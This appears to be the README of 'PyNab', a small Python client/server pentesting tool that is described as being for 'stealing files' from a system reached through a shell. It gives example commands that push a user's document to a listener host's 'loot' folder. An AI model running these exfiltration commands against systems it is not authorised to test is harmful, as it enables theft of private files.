# PyNab
##### A pentesting tool for easily stealing files
_Made with <3 By Dan Goodman, Signed 12/31/17_

_Works as a nifty file sharing tool too!_

---

Running this assumes you already know where the file is, this should be used through a shell after all. This is to make it easier than worrying about making sure you can SCP to a system.

The server is required to be run for every file sent, will eventually make it so the server has to be run only once to get multiple files.

Also currently only accepts one connection in

### Client:

Run like:

    python3 clientNab.py IP PORT FILELOCATION

replacing `IP`, `PORT`, and `FILELOCATION` with the respective values

Example use:

    python3 clientNab.py 192.168.1.30 5555 /Users/{some username}/Documents/SuperSecretStuff.docx

This will drop that file into a loot folder where the `serverNab.py` file is running on the server.

This should also work for Python 2, but the print statements and encoding/decoding might need to be changed.


### Server:

Run like:

    serverNab.py IP PORT

replacing `IP`, `PORT`, and `FILELOCATION` with the respective values

Example use:

    serverNab.py 129.168.1.45 5555

Make sure to run this before the client!